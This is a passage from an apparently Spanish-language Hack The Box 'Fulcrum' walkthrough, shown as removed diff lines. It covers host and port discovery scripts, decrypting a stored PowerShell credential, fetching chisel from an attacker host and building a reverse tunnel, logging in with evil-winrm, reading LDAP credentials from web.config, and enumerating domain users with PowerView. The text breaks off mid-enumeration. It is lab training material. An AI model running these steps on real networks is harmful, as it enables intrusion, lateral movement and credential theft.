-</code></pre></div></div>
-
-<h2 id="shell-as-webuser">Shell as webuser</h2>
-
-<ul>
-  <li>Esta activa.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# ping <span class="nt">-c</span> 1 192.168.122.1 &amp;&gt;/dev/null
-root@fulcrum:/tmp# <span class="nb">echo</span> <span class="nv">$?</span>
-0
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a escanear la interfaz hosts activas en ese segmento de red.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# <span class="nb">chmod</span> +x hostDiscovery.sh
-root@fulcrum:/tmp# <span class="nb">cat </span>hostDiscovery.sh
-<span class="c">#!/bin/bash</span>
-
-<span class="k">function </span>ctrl_c<span class="o">(){</span>
-	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Saliendo...</span><span class="se">\n</span><span class="s2">"</span>
-	tput cnorm<span class="p">;</span> <span class="nb">exit </span>1
-<span class="o">}</span>
-
-<span class="c"># CTRL+C</span>
-<span class="nb">trap </span>ctrl_c INT
-
-tput civis
-<span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 254<span class="si">)</span><span class="p">;</span> <span class="k">do
-	</span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"ping -c 1 192.168.122.</span><span class="nv">$i</span><span class="s2">"</span> &amp;&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[+] host 192.168.122.</span><span class="nv">$i</span><span class="s2"> - ACTIVE"</span> &amp;
-<span class="k">done</span><span class="p">;</span> <span class="nb">wait
-</span>tput cnorm
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos los hosts abiertos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# ./hostDiscovery.sh
-<span class="o">[</span>+] host 192.168.122.1 - ACTIVE
-<span class="o">[</span>+] host 192.168.122.228 - ACTIVE
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Esta activo.</p>
-  </li>
-  <li>
-    <p>Estamos ante una maquina Windows.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# ping <span class="nt">-c</span> 1 192.168.122.228
-PING 192.168.122.228 <span class="o">(</span>192.168.122.228<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
-64 bytes from 192.168.122.228: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>128 <span class="nb">time</span><span class="o">=</span>0.360 ms
-
-<span class="nt">---</span> 192.168.122.228 ping statistics <span class="nt">---</span>
-1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
-rtt min/avg/max/mdev <span class="o">=</span> 0.360/0.360/0.360/0.000 ms
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora vamos a descubrir los puertos abiertos que tiene la máquina victima.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# nano portDiscovery.sh
-root@fulcrum:/tmp# <span class="nb">cat </span>portDiscovery.sh
-<span class="c">#!/bin/bash</span>
-
-<span class="k">for </span>port <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 65535<span class="si">)</span><span class="p">;</span> <span class="k">do
-	</span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"echo '' &gt; /dev/tcp/192.168.122.228/</span><span class="nv">$port</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[+] Port </span><span class="nv">$port</span><span class="s2"> - OPEN"</span> &amp;
-<span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@fulcrum:/tmp# ./portDiscovery.sh
-<span class="o">[</span>+] Port 80 - OPEN
-<span class="o">[</span>+] Port 5985 - OPEN
-</code></pre></div></div>
-
-<ul>
-  <li>Si examinamos la ruta <strong>/uploads</strong> vemos un archivo con data interesante es un script en <code class="language-plaintext highlighter-rouge">powershell</code> que define la credencial de <code class="language-plaintext highlighter-rouge">webuser</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:~/uploads<span class="nv">$ </span><span class="nb">cat </span>Fulcrum_Upload_to_Corp.ps1
-<span class="c"># TODO: Forward the PowerShell remoting port to the external interface</span>
-<span class="c"># Password is now encrypted \o/</span>
-
-<span class="nv">$1</span> <span class="o">=</span> <span class="s1">'WebUser'</span>
-<span class="nv">$2</span> <span class="o">=</span> <span class="s1">'77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48'</span> <span class="nt">-split</span> <span class="s1">','</span>
-<span class="nv">$3</span> <span class="o">=</span> <span class="s1">'76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='</span>
-<span class="nv">$4</span> <span class="o">=</span> <span class="nv">$3</span> | ConvertTo-SecureString <span class="nt">-key</span> <span class="nv">$2</span>
-<span class="nv">$5</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="o">(</span><span class="nv">$1</span>, <span class="nv">$4</span><span class="o">)</span>
-
-Invoke-Command <span class="nt">-Computer</span> upload.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$5</span> <span class="nt">-File</span> Data.ps1
-</code></pre></div></div>
-
-<ul>
-  <li>Encontramos un articulo donde nos dicen como podemos ver la contraseña en texto plano <a href="https://stackoverflow.com/questions/7468389/powershell-decode-system-security-securestring-to-readable-password">https://stackoverflow.com/questions/7468389/powershell-decode-system-security-securestring-to-readable-password</a> pero nos podemos guiar de ese articulo.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ pwsh
-PowerShell 7.2.6
-Copyright <span class="o">(</span>c<span class="o">)</span> Microsoft Corporation.
-
-https://aka.ms/powershell
-Type <span class="s1">'help'</span> to get help.
-
-
-┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
-└─PS&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a interpretarlo.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
-└─PS&gt; <span class="nv">$1</span> <span class="o">=</span> <span class="s1">'WebUser'</span>
-
-┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
-└─PS&gt; <span class="nv">$2</span> <span class="o">=</span> <span class="s1">'77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48'</span> <span class="nt">-split</span> <span class="s1">','</span>
-
-┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
-└─PS&gt; <span class="nv">$3</span> <span class="o">=</span> <span class="s1">'76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='</span>
-
-┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
-└─PS&gt; <span class="nv">$4</span> <span class="o">=</span> <span class="nv">$3</span> | ConvertTo-SecureString <span class="nt">-key</span> <span class="nv">$2</span>
-
-┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
-└─PS&gt; <span class="nv">$5</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="o">(</span><span class="nv">$1</span>, <span class="nv">$4</span><span class="o">)</span>
-
-┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
-└─PS&gt;
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
-└─PS&gt; <span class="nv">$Ptr</span> <span class="o">=</span> <span class="o">[</span>System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode<span class="o">(</span><span class="nv">$4</span><span class="o">)</span>
-
-┌──<span class="o">(</span>miguel㉿miguelos<span class="o">)</span>-[/home/miguel]
-└─PS&gt; <span class="nv">$4</span>
-System.Security.SecureString
-</code></pre></div></div>
-
-<ul>
-  <li>Y vemos la contraseña.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UserName Password
-<span class="nt">--------</span> <span class="nt">--------</span>
-WebUser  M4ng£m£ntPa55
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>El puerto del servicio de <code class="language-plaintext highlighter-rouge">evil-winrm</code> esta abierto a si que podemos conectarnos con ese usuario y esa contraseña pero necesitamos hacer un túnel para poder llegar a esa <code class="language-plaintext highlighter-rouge">IP</code> ya que no tenemos conectividad desde nuestra máquina.</p>
-  </li>
-  <li>
-    <p>Haremos Remote Port Forwaring <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">gunzip </span>chisel_1.9.1_linux_amd64.gz
-➜  content <span class="nb">ls
-</span>chisel_1.9.1_linux_amd64  creds.txt
-➜  content <span class="nb">chmod</span> +x chisel_1.9.1_linux_amd64
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a pasarlo a la máquina victima.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:/tmp<span class="nv">$ </span>wget http://10.10.14.62:10/chisel_1.9.1_linux_amd64
-<span class="nt">--2024-06-14</span> 23:11:47--  http://10.10.14.62:10/chisel_1.9.1_linux_amd64
-Connecting to 10.10.14.62:10... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 8654848 <span class="o">(</span>8.3M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
-Saving to: <span class="s1">'chisel_1.9.1_linux_amd64'</span>
-
-chisel_1.9.1_linux_ 100%[<span class="o">===================&gt;]</span>   8.25M  2.93MB/s    <span class="k">in </span>2.8s
-
-2024-06-14 23:11:50 <span class="o">(</span>2.93 MB/s<span class="o">)</span> - <span class="s1">'chisel_1.9.1_linux_amd64'</span> saved <span class="o">[</span>8654848/8654848]
-www-data@fulcrum:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x chisel_1.9.1_linux_amd64
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora ejecutamos el chisel en nuestra máquina para estar en modo servidor.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./chisel_1.9.1_linux_amd64 server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
-2024/06/14 17:13:45 server: Reverse tunnelling enabled
-2024/06/14 17:13:45 server: Fingerprint <span class="nv">QauEzPD66q6tCwMPbC8G9HA07OU0KldXvnbkZLhVKQQ</span><span class="o">=</span>
-2024/06/14 17:13:45 server: Listening on http://0.0.0.0:1234
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora lo ejecutamos en la máquina victima.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel_1.9.1_linux_amd64 client 10.10.14.62:1234 R:5985
-2024/06/14 23:15:29 client: Connecting to ws://10.10.14.62:1234
-2024/06/14 23:15:30 client: Connected <span class="o">(</span>Latency 112.623194ms<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Recibimos la conexión.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./chisel_1.9.1_linux_amd64 server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
-2024/06/14 17:13:45 server: Reverse tunnelling enabled
-2024/06/14 17:13:45 server: Fingerprint <span class="nv">QauEzPD66q6tCwMPbC8G9HA07OU0KldXvnbkZLhVKQQ</span><span class="o">=</span>
-2024/06/14 17:13:45 server: Listening on http://0.0.0.0:1234
-2024/06/14 17:15:29 server: session#1: tun: proxy#R:5985<span class="o">=&gt;</span>192.168.122.228:5985: Listening
-</code></pre></div></div>
-
-<h2 id="shell-as-btables">Shell as btables</h2>
-
-<ul>
-  <li>Ahora ya nos podemos conectar.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ evil-winrm <span class="nt">-i</span> 127.0.0.1 <span class="nt">-u</span> <span class="s1">'WebUser'</span> <span class="nt">-p</span> <span class="s1">'M4ng£m£ntPa55'</span>
-
-Evil-WinRM shell v3.5
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\W</span>ebUser<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
-</span>webserver<span class="se">\w</span>ebuser
-</code></pre></div></div>
-
-<ul>
-  <li>En la máquina victima hay una pagina web y en esta ruta encontramos credenciales.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">cd </span>C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt; <span class="nb">dir
-
-
-    </span>Directory: C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot
-
-
-Mode                LastWriteTime         Length Name
-<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
-<span class="nt">-a----</span>         5/8/2022   2:46 AM            703 iisstart.htm
-<span class="nt">-a----</span>         5/8/2022   2:46 AM          99710 iisstart.png
-<span class="nt">-a----</span>        2/12/2022  11:42 PM           5252 index.htm
-<span class="nt">-a----</span>        2/12/2022  11:42 PM           1280 web.config
-
-
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt; <span class="nb">type </span>web.config
-&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
-&lt;configuration <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/.NetConfiguration/v2.0"</span><span class="o">&gt;</span>
-    &lt;appSettings /&gt;
-    &lt;connectionStrings&gt;
-        &lt;add <span class="nv">connectionString</span><span class="o">=</span><span class="s2">"LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"ADServices"</span> /&gt;
-    &lt;/connectionStrings&gt;
-    &lt;system.web&gt;
-        &lt;membership <span class="nv">defaultProvider</span><span class="o">=</span><span class="s2">"ADProvider"</span><span class="o">&gt;</span>
-            &lt;providers&gt;
-                &lt;add <span class="nv">name</span><span class="o">=</span><span class="s2">"ADProvider"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"</span> <span class="nv">connectionStringName</span><span class="o">=</span><span class="s2">"ADConnString"</span> <span class="nv">connectionUsername</span><span class="o">=</span><span class="s2">"FULCRUM</span><span class="se">\L</span><span class="s2">DAP"</span> <span class="nv">connectionPassword</span><span class="o">=</span><span class="s2">"PasswordForSearching123!"</span> <span class="nv">attributeMapUsername</span><span class="o">=</span><span class="s2">"SAMAccountName"</span> /&gt;
-            &lt;/providers&gt;
-        &lt;/membership&gt;
-    &lt;/system.web&gt;
-&lt;system.webServer&gt;
-   &lt;httpProtocol&gt;
-      &lt;customHeaders&gt;
-           &lt;clear /&gt;
-      &lt;/customHeaders&gt;
-   &lt;/httpProtocol&gt;
-        &lt;defaultDocument&gt;
-            &lt;files&gt;
-                &lt;clear /&gt;
-                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"Default.asp"</span> /&gt;
-                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"Default.htm"</span> /&gt;
-                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"index.htm"</span> /&gt;
-                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"index.html"</span> /&gt;
-                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"iisstart.htm"</span> /&gt;
-            &lt;/files&gt;
-        &lt;/defaultDocument&gt;
-&lt;/system.webServer&gt;
-&lt;/configuration&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Ese es el <code class="language-plaintext highlighter-rouge">domain controller</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt; ping dc.fulcrum.local
-
-Pinging dc.fulcrum.local <span class="o">[</span>192.168.122.130] with 32 bytes of data:
-Request timed out.
-</code></pre></div></div>
-
-<ul>
-  <li>Tenemos una credencial a nivel de dominio vamos a enumerar el dominio para eso usaremos el siguiente recurso <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt;  <span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">mkdir </span>Privesc
-
-
-    Directory: C:<span class="se">\W</span>indows<span class="se">\T</span>emp
-
-
-Mode                LastWriteTime         Length Name
-<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
-d-----        6/15/2024  12:48 AM                Privesc
-
-
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">cd </span>Privesc
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; upload /home/miguel/Hackthebox/Fulcrum/nmap/PowerView.ps1
-
-Info: Uploading /home/miguel/Hackthebox/Fulcrum/nmap/PowerView.ps1 to C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc<span class="se">\P</span>owerView.ps1
-
-Data: 1027036 bytes of 1027036 bytes copied
-
-Info: Upload successful!
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a importar el modulo.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .<span class="se">\P</span>owerView.ps1
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora definimos todo como no lo dicen en el script de PowerView.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'PasswordForSearching123!'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'FULCRUM\LDAP'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a listar todos los usuario del dominio.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Get-DomainUser <span class="nt">-Credential</span> <span class="nv">$Cred</span>
-
-
-logoncount             : 6
-badpasswordtime        : 12/31/1600 4:00:00 PM
-description            : Built-in account <span class="k">for </span>administering the computer/domain
-distinguishedname      : <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>objectclass            : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
-lastlogontimestamp     : 5/7/2022 11:56:07 PM
-name                   : Administrator
-objectsid              : S-1-5-21-1158016984-652700382-3033952538-500
-samaccountname         : Administrator
-logonhours             : <span class="o">{</span>255, 255, 255, 255...<span class="o">}</span>
-admincount             : 1
-codepage               : 0
-samaccounttype         : USER_OBJECT
-accountexpires         : 12/31/1600 4:00:00 PM
-countrycode            : 0
-whenchanged            : 5/8/2022 8:14:22 AM
-instancetype           : 4
-objectguid             : 73409563-3e6c-4ac9-9bd8-a804c6519ead
-lastlogon              : 5/8/2022 1:49:11 AM
-lastlogoff             : 12/31/1600 4:00:00 PM
-objectcategory         : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>dscorepropagationdata  : <span class="o">{</span>5/8/2022 7:10:32 AM, 5/8/2022 7:10:32 AM, 5/8/2022 6:55:22 AM, 1/1/1601 6:12:16 PM<span class="o">}</span>
-memberof               : <span class="o">{</span><span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local</span>, <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local</span>, <span class="nv">CN</span><span class="o">=</span>Enterprise Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local</span>, <span class="nv">CN</span><span class="o">=</span>Schema Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span>local...<span class="o">}</span>
-whencreated            : 5/8/2022 6:52:43 AM
-iscriticalsystemobject : True
-badpwdcount            : 0
-cn                     : Administrator
-useraccountcontrol     : NORMAL_ACCOUNT
-usncreated             : 8196
-primarygroupid         : 513
-pwdlastset             : 5/8/2022 1:14:22 AM
-usnchanged             : 12848
-
-pwdlastset             : 12/31/1600 4:00:00 PM
-logoncount             : 0
-badpasswordtime        : 12/31/1600 4:00:00 PM
-description            : Built-in account <span class="k">for </span>guest access to the computer/domain
-distinguishedname      : <span class="nv">CN</span><span class="o">=</span>Guest,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>objectclass            : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
-name                   : Guest
-objectsid              : S-1-5-21-1158016984-652700382-3033952538-501
-samaccountname         : Guest
-codepage               : 0
-samaccounttype         : USER_OBJECT
-accountexpires         : NEVER
-countrycode            : 0
-whenchanged            : 5/8/2022 6:52:43 AM
-instancetype           : 4
-objectguid             : 07e39362-1d6b-4f14-939a-75a5cc85d91d
-lastlogon              : 12/31/1600 4:00:00 PM
-lastlogoff             : 12/31/1600 4:00:00 PM
-objectcategory         : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>dscorepropagationdata  : <span class="o">{</span>5/8/2022 6:55:22 AM, 1/1/1601 12:00:01 AM<span class="o">}</span>
-memberof               : <span class="nv">CN</span><span class="o">=</span>Guests,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>whencreated            : 5/8/2022 6:52:43 AM
-badpwdcount            : 0
-cn                     : Guest
-useraccountcontrol     : ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
-usncreated             : 8197
-primarygroupid         : 514
-iscriticalsystemobject : True
-usnchanged             : 8197
-
-logoncount                    : 0
-badpasswordtime               : 12/31/1600 4:00:00 PM
-description                   : Key Distribution Center Service Account
-distinguishedname             : <span class="nv">CN</span><span class="o">=</span>krbtgt,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>objectclass                   : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
-name                          : krbtgt
-primarygroupid                : 513
-objectsid                     : S-1-5-21-1158016984-652700382-3033952538-502
-samaccountname                : krbtgt
-admincount                    : 1
-codepage                      : 0
-samaccounttype                : USER_OBJECT
-showinadvancedviewonly        : True
-accountexpires                : NEVER
-cn                            : krbtgt
-whenchanged                   : 5/8/2022 7:10:32 AM
-instancetype                  : 4
-objectguid                    : e6e5f620-8510-45f2-9ddc-0b36e43f55fd
-lastlogon                     : 12/31/1600 4:00:00 PM
-lastlogoff                    : 12/31/1600 4:00:00 PM
-objectcategory                : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>dscorepropagationdata         : <span class="o">{</span>5/8/2022 7:10:32 AM, 5/8/2022 6:55:22 AM, 1/1/1601 12:04:16 AM<span class="o">}</span>
-serviceprincipalname          : kadmin/changepw
-memberof                      : <span class="nv">CN</span><span class="o">=</span>Denied RODC Password Replication Group,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>whencreated                   : 5/8/2022 6:55:21 AM
-iscriticalsystemobject        : True
-badpwdcount                   : 0
-useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
-usncreated                    : 12324
-countrycode                   : 0
-pwdlastset                    : 5/7/2022 11:55:21 PM
-msds-supportedencryptiontypes : 0
-usnchanged                    : 12831
-
-company               : fulcrum
-logoncount            : 1
-badpasswordtime       : 12/31/1600 4:00:00 PM
-st                    : UN
-l                     : unknown
-distinguishedname     : <span class="nv">CN</span><span class="o">=</span>ldap,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>objectclass           : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
-lastlogontimestamp    : 6/15/2024 12:56:14 AM
-name                  : ldap
-objectsid             : S-1-5-21-1158016984-652700382-3033952538-1103
-samaccountname        : ldap
-codepage              : 0
-samaccounttype        : USER_OBJECT
-accountexpires        : NEVER
-countrycode           : 0
-whenchanged           : 6/15/2024 7:56:14 AM
-instancetype          : 4
-usncreated            : 12595
-objectguid            : cc068896-96ca-4bdd-a6e9-cea49d58c6ec
-sn                    : user
-lastlogoff            : 12/31/1600 4:00:00 PM
-objectcategory        : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
-</span>dscorepropagationdata : 1/1/1601 12:00:00 AM
-givenname             : ldap
-c                     : UK
-lastlogon             : 6/15/2024 12:56:14 AM
-streetaddress         : unknown
-badpwdcount           : 0
-cn                    : ldap
-useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
-whencreated           : 5/8/2022 7:02:27 AM
-primarygroupid        : 513
-pwdlastset            : 5/8/2022 12:02:27 AM
-usnchanged            : 24668
-postalcode            : 12345
-
-company               : fulcrum
-logoncount            : 0
-badpasswordtime       : 12/31/1600 4:00:00 PM
-st                    : UN
-l                     : unknown
